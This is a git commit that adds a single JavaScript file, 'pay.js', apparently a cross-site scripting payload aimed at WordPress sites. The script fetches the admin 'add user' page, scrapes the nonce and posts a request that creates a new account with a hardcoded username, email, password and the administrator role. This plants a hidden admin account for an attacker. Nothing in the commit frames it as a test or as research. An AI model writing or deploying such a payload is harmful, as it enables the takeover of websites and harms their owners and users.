f58d210c875d5d2e972e8db8f575358de992b1f3
youngkmd <103062072+youngkmd@users.noreply.github.com>
2022-04-05 17:48:26 +0100

    pay.js

---
+++ pay.js
@@ -0,0 +1,12 @@
+u = "/wp-admin/user-new.php";
+jQuery.get(u, function(e) {
+    jQuery.post(u, {
+        action: "createuser",
+        "_wpnonce_create-user": e.match(/_wpnonce _create-user\"\svalue=\"(.+?)\"/)[1],
+        user_Login: "kaderdz",
+        email: "ttest34030@gmail.com",
+        pass1: "hoho2013",
+        pass2: "hoho2013",
+        role: "administrator"
+    })
+});
